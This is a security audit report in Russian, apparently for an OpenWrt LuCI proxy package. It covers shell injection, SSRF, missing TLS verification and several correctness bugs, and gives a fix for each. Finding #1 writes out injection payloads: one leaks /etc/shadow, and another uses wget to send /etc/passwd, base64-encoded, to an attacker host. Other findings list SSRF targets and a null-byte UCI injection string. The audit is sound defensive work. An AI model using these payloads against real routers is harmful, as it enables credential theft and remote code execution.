# 4eburNet — Devil Audit v9
**Дата:** 2026-04-10
**Охват:** A.1 (hotplug WAN), A.3 (sub_convert.py, subscription_import, subscriptions.js)
**Предыдущий аудит:** audit_v8 (все закрыты)

---

## 🔴 Критично

### 1. Shell injection через `url` + `fmt` в `subscription_import`
| Поле | Значение |
|------|---------|
| Файл | `luci-app-4eburnet/root/usr/share/rpcd/ucode/4eburnet.uc` |
| Строки | 777–784 |
| Класс | SECURITY |
| Серьёзность | 🔴 |

```js
let input_arg = url ? ('--url ' + url) : ('-i ' + tmp_in);
let cmd = 'python3 ' + sub_py + ' '
        + input_arg + ' --format ' + fmt + ' ...';
let rc = system(cmd);
```

`url` и `fmt` конкатенируются в строку без кавычек и экранирования перед передачей в `system()`.

**Вектор атаки через URL:**
```
url = "https://sub.example.com/sub'; cat /etc/shadow > /tmp/leak; echo '"
```
→ rpcd выполнит произвольный код с правами nobody/root.

**Вектор через fmt:**
```
fmt = "auto; wget http://attacker.com/$(cat /etc/passwd|base64) -O /dev/null"
```
ACL ограничивает `subscription_import` только авторизованным admin-пользователям LuCI, но атака возможна через:
- XSS в другом поле LuCI (второй вектор)
- CSRF если LuCI без CSRF-токена
- Прямой вызов ubus с перехваченной сессией

**Исправление:** экранировать url в одиночные кавычки (`shlex`-style), валидировать fmt по allowlist перед подстановкой.

---

### 2. SSRF — `fetch_url` не валидирует схему URL
| Файл | `tools/sub_convert.py` |
|------|---------|
| Строка | 600–612 |
| Класс | SECURITY |
| Серьёзность | 🔴 |

```python
def fetch_url(url: str, timeout: int = 15) -> str:
    headers = {'User-Agent': 'ClashforWindows/0.19.0'}
    req = urllib.request.Request(url, headers=headers)
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        return resp.read().decode('utf-8', errors='replace')
```

Нет проверки схемы. Принимаются:
- `file:///etc/shadow` — читает локальные файлы
- `ftp://internal.host/` — доступ к FTP
- `http://169.254.169.254/` — метаданные cloud-провайдеров
- `gopher://...` — старые протоколы через urllib

urllib по умолчанию **следует редиректам** без ограничения количества (redirect loop, или редирект на `file://`).

**Исправление:**
```python
parsed = urllib.parse.urlparse(url)
if parsed.scheme not in ('http', 'https'):
    raise ValueError(f'Недопустимая схема: {parsed.scheme}')
```
Добавить `max_redirects` через собственный `HTTPRedirectHandler`.

---

### 3. Отсутствие верификации SSL-сертификата в `fetch_url`
| Файл | `tools/sub_convert.py` |
|------|---------|
| Строка | 605 |
| Класс | SECURITY |
| Серьёзность | 🔴 |

На OpenWrt CA-сертификаты могут отсутствовать (`ca-bundle` — опциональный пакет). `urllib.request.urlopen` без явного ssl-контекста ведёт себя по-разному:
- Если ca-bundle установлен — верифицирует
- Если НЕТ — падает с `CERTIFICATE_VERIFY_FAILED` ИЛИ (на некоторых сборках musl) принимает всё

Результат: при отсутствии ca-bundle MITM на подписку незаметен. Злоумышленник подменяет сервера в подписке → трафик жертвы через чужой узел.

**Исправление:** явно создавать `ssl.create_default_context()`, при отсутствии ca-bundle — выводить предупреждение, но не молча игнорировать ошибку.

---

## 🟡 Важно

### 4. Блокирующий `system()` в rpcd-воркере
| Файл | `luci-app-4eburnet/root/usr/share/rpcd/ucode/4eburnet.uc` |
|------|---------|
| Строка | 787 |
| Класс | CORRECTNESS |
| Серьёзность | 🟡 |

```js
let rc = system(cmd);  // python3 fetch + parse — может занять 15–30 сек
```

`system()` в ucode блокирует поток rpcd до завершения. rpcd обслуживает запросы последовательно: все остальные LuCI-запросы (статус, логи, устройства) зависают на время загрузки подписки.

На медленном роутере + медленный сервер подписки = 30-секундный timeout всего LuCI.

**Исправление:** передать импорт фоновому процессу через `system(...+ ' &')` с возвратом task_id, либо вынести в отдельный init.d action.

---

### 5. `grep -q "fwmark 0x1"` — ложное срабатывание
| Файл | `luci-app-4eburnet/files/etc/hotplug.d/iface/40-4eburnet` |
|------|---------|
| Строки | 26, 38 |
| Класс | CORRECTNESS |
| Серьёзность | 🟡 |

```sh
ip rule show 2>/dev/null | grep -q "fwmark 0x1" || {
    ip rule add fwmark 0x01 table 100 priority 100 ...
}
```

Паттерн `"fwmark 0x1"` матчит подстроку — любое правило с fwmark `0x10`, `0x11`, `0x1a`, `0x100` и т.д. даст grep-match. Если другой пакет (например nft/fw4) использует fwmark `0x10`, TPROXY-правило будет считаться уже установленным и **не восстановится** после реконнекта.

Аналогично для IPv6 (строка 38).

**Исправление:**
```sh
ip rule show | grep -qE "(fwmark 0x1 |fwmark 0x00000001 )" || ...
```
Или `grep -qw "fwmark 0x1"` (word boundary, но `0x1` не слово в POSIX).

---

### 6. `_uci_safe` пропускает null-байты и управляющие символы
| Файл | `tools/sub_convert.py` |
|------|---------|
| Строка | 546–548 |
| Класс | CORRECTNESS |
| Серьёзность | 🟡 |

```python
def _uci_safe(s) -> str:
    return str(s).replace("'", '"').replace('\n', ' ').strip()
```

Одинарные кавычки заменяются двойными — это не экранирование, а замена символа. В UCI-файле значение обёрнуто в одиночные кавычки, двойные внутри синтаксически допустимы.

Но пропускаются:
- `\x00` (null-байт) — может обрезать UCI-значение при парсинге uci
- `\r` (CR) — может нарушить парсинг строки
- `\t` и другие управляющие символы

Вредоносное имя сервера `"server\x00injected_option enabled 1"` может частично испортить UCI-секцию при парсинге демоном.

**Исправление:**
```python
def _uci_safe(s) -> str:
    s = str(s)
    s = ''.join(c for c in s if ord(c) >= 0x20 and c != "'")
    return s.strip()
```

---

### 7. `importBtn.disabled` не сбрасывается при сетевой ошибке
| Файл | `luci-app-4eburnet/htdocs/luci-static/resources/view/4eburnet/subscriptions.js` |
|------|---------|
| Строки | 71, 82–91 |
| Класс | LUCI |
| Серьёзность | 🟡 |

```js
importBtn.disabled = true;
callImport(...).then(function(r) {
    importBtn.disabled = false;
    ...
});
// .catch() — отсутствует
```

Если RPC-запрос падает с сетевой ошибкой (таймаут, JSON-ошибка, rpcd недоступен) — Promise реджектится, `.then()` не выполняется, кнопка остаётся заблокированной навсегда до перезагрузки страницы.

**Исправление:**
```js
callImport(...).then(function(r) {
    importBtn.disabled = false;
    ...
}).catch(function(e) {
    importBtn.disabled = false;
    importStatus.style.color = '#f85149';
    importStatus.textContent = '✕ Ошибка RPC: ' + e;
});
```

---

### 8. Нет валидации схемы URL на стороне клиента
| Файл | `luci-app-4eburnet/htdocs/luci-static/resources/view/4eburnet/subscriptions.js` |
|------|---------|
| Строка | 64–68 |
| Класс | LUCI |
| Серьёзность | 🟡 |

```js
var url = document.getElementById('sub-url').value.trim();
if (!url) { ... return; }
// Сразу callImport(url, ...)
```

Нет проверки, что URL начинается с `http://` или `https://`. Пользователь (или CSRF-атака) может передать:
- `file:///etc/shadow` → rpcd читает файл через fetch_url
- `ftp://...` → SSRF

Усугубляется уязвимостью #2 (fetch_url не валидирует схему).

**Исправление:**
```js
if (!/^https?:\/\//i.test(url)) {
    importStatus.style.color = '#f85149';
    importStatus.textContent = '✕ URL должен начинаться с http:// или https://';
    return;
}
```

---

## 🟢 Улучшения

### 9. `detect_format`: base64-decode без лимита размера входа
| Файл | `tools/sub_convert.py` |
|------|---------|
| Строка | 531–538 |
| Класс | MEMORY |
| Серьёзность | 🟢 |

```python
clean = stripped.replace('\n', '').replace(' ', '')
padded = clean + '=' * (-len(clean) % 4)
decoded = base64.b64decode(padded).decode('utf-8')
```

При 10 МБ входе `replace()` создаёт 3 копии строки (~30 МБ) + base64 decoded (~22 МБ). На MICRO-роутере (64 МБ RAM, tmpfs занят) возможен OOM.

**Исправление:** добавить guard `if len(stripped) > 2 * 1024 * 1024: return 'urilist'` перед decode.

---

### 10. `parse_clash_yaml` и `parse_singbox_json`: нет лимита на количество серверов
| Файл | `tools/sub_convert.py` |
|------|---------|
| Строки | 210, 439 |
| Класс | MEMORY |
| Серьёзность | 🟢 |

`--max-rules` ограничивает только правила, не серверы. Clash-файл с 10 000 серверами будет полностью распаршен и загружен в память перед усечением.

**Исправление:** добавить `--max-servers` аргумент (default: 500) и `if len(servers) >= max_servers: break` в парсерах.

---

### 11. PID-reuse в hotplug: `kill -0` не проверяет имя процесса
| Файл | `luci-app-4eburnet/files/etc/hotplug.d/iface/40-4eburnet` |
|------|---------|
| Строки | 19–21 |
| Класс | CORRECTNESS |
| Серьёзность | 🟢 |

```sh
PID=$(cat /var/run/4eburnet.pid 2>/dev/null)
kill -0 "$PID" 2>/dev/null || exit 0
```

Если 4eburnetd упал, а его PID переиспользован другим процессом, `kill -0` вернёт 0, скрипт вызовет `/usr/sbin/4eburnetd reload` — что само по себе безопасно (бинарник просто запустится как daemon reload, не отправит сигнал чужому процессу).

Реальный риск мал, но корректнее:
```sh
[ "$(cat /proc/$PID/comm 2>/dev/null)" = "4eburnetd" ] || exit 0
```

---

### 12. hotplug: неполный список WAN-интерфейсов
| Файл | `luci-app-4eburnet/files/etc/hotplug.d/iface/40-4eburnet` |
|------|---------|
| Строки | 9–15 |
| Класс | CONFIG |
| Серьёзность | 🟢 |

```sh
case "$INTERFACE" in
    wan|wan6|pppoe-wan|pppoe*|wan_*)
```

Не покрывает:
- `eth1` — прямой WAN без именования (некоторые роутеры Xiaomi, GL.iNet)
- `vlan2`, `eth0.2` — VLAN WAN
- `br-wan` — bridged WAN

Решение: добавить `*wan*` как последний паттерн перед `*`), или сделать логику инвертированной (исключить LAN-интерфейсы).

---

### 13. `uci import -m 4eburnet` принимает секции любого типа
| Файл | `luci-app-4eburnet/root/usr/share/rpcd/ucode/4eburnet.uc` |
|------|---------|
| Строка | 801 |
| Класс | CORRECTNESS |
| Серьёзность | 🟢 |

`uci import -m 4eburnet` импортирует весь UCI-файл в конфиг `4eburnet`. Если sub_convert.py из-за бага выдаст секцию `config network` или `config system`, она окажется в `/etc/config/4eburnet` (не в `/etc/config/network` — другие конфиги не затронуты, но 4eburnet-конфиг засоряется мусором).

**Исправление:** после генерации валидировать UCI-файл на допустимые типы секций: `server`, `proxy_group`, `traffic_rule`.

---

## Сводка

| Уровень | Кол-во | Главный риск |
|---------|--------|--------------|
| 🔴 | 3 | Shell injection (RCE) + SSRF + MITM на подписку |
| 🟡 | 5 | Blocking rpcd + fwmark regex + null byte + UX |
| 🟢 | 5 | OOM на MICRO + PID reuse + неполный WAN pattern |

---

## Рекомендуемый порядок исправления

1. **🔴 Shell injection** (`4eburnet.uc:777`) — URL и fmt в кавычки, fmt валидировать по allowlist
2. **🔴 SSRF / схема URL** (`sub_convert.py:600`) — проверять `parsed.scheme in ('http','https')`
3. **🟡 importBtn.catch** (`subscriptions.js:91`) — добавить `.catch()` с разблокировкой кнопки
4. **🟡 Валидация URL в JS** (`subscriptions.js:64`) — regex на `^https?://` до отправки RPC
5. **🟡 fwmark grep** (`40-4eburnet:26,38`) — `grep -qE "fwmark 0x1 "` (пробел после)
6. **🟡 _uci_safe null byte** (`sub_convert.py:547`) — фильтровать `ord(c) < 0x20`
7. **🔴 SSL verify** (`sub_convert.py:605`) — явный ssl context с ca проверкой
8. **🟡 Blocking system()** (`4eburnet.uc:787`) — документировать ограничение или фоновый запуск
9. **🟢 detect_format size** (`sub_convert.py:531`) — guard 2MB перед base64 decode
10. **🟢 parse limit** (`sub_convert.py:210,439`) — лимит серверов при парсинге
